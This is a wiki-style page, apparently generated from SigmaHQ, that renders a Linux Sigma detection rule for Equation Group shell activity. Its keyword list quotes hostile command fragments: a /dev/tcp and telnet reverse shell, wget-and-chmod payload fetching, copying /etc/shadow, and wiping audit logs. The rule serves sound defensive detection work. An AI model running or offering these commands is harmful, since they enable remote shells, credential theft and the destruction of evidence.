---
sigma_id: "41e5c73d-9983-4b69-bd03-e13b67e9623c"
title: "Equation Group Indicators"
framework: "sigma"
generated: "true"
source_path: "rules/linux/builtin/lnx_apt_equationgroup_lnx.yml"
source_url: "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml"
build_date: "2026-04-26 15:01:44"
status: "test"
level: "high"
logsource: "linux"
aliases:
  - "41e5c73d-9983-4b69-bd03-e13b67e9623c"
  - "Equation Group Indicators"
attack_technique_ids:
  - "T1059.004"
tags:
  - "sigma"
  - "detection-rule"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Equation Group Indicators

Detects suspicious shell commands used in various Equation Group scripts and tools

## Metadata

- Rule ID: 41e5c73d-9983-4b69-bd03-e13b67e9623c
- Status: test
- Level: high
- Author: Florian Roth (Nextron Systems)
- Date: 2017-04-09
- Modified: 2021-11-27
- Source Path: rules/linux/builtin/lnx_apt_equationgroup_lnx.yml

## Logsource

- product: linux

## ATT&CK Mapping

### Techniques

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.004]]

## Detection

```yaml
keywords:
- 'chown root*chmod 4777 '
- cp /bin/sh .;chown
- chmod 4777 /tmp/.scsi/dev/bin/gsh
- chown root:root /tmp/.scsi/dev/bin/
- chown root:root x;
- /bin/telnet locip locport < /dev/console | /bin/sh
- /tmp/ratload
- 'ewok -t '
- 'xspy -display '
- cat > /dev/tcp/127.0.0.1/80 <<END
- rm -f /current/tmp/ftshell.latest
- 'ghost_* -v '
- ' --wipe > /dev/null'
- ping -c 2 *; grep * /proc/net/arp >/tmp/gx
- iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;
- '> /var/log/audit/audit.log; rm -f .'
- cp /var/log/audit/audit.log .tmp
- sh >/dev/tcp/* <&1 2>&1
- ncat -vv -l -p * <
- nc -vv -l -p * <
- < /dev/console | uudecode && uncompress
- sendmail -osendmail;chmod +x sendmail
- /usr/bin/wget -O /tmp/a http* && chmod 755 /tmp/cron
- chmod 666 /var/run/utmp~
- chmod 700 nscd crond
- cp /etc/shadow /tmp/.
- </dev/console |uudecode > /dev/null 2>&1 && uncompress
- chmod 700 jp&&netstat -an|grep
- uudecode > /dev/null 2>&1 && uncompress -f * && chmod 755
- chmod 700 crond
- wget http*; chmod +x /tmp/sendmail
- chmod 700 fp sendmail pt
- chmod 755 /usr/vmsys/bin/pipe
- chmod -R 755 /usr/vmsys
- chmod 755 $opbin/*tunnel
- chmod 700 sendmail
- chmod 0700 sendmail
- /usr/bin/wget http*sendmail;chmod +x sendmail;
- '&& telnet * 2>&1 </dev/console'
condition: keywords
```

## False Positives

- Unknown

## References

- https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1

## Source

- [Source YAML](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml)
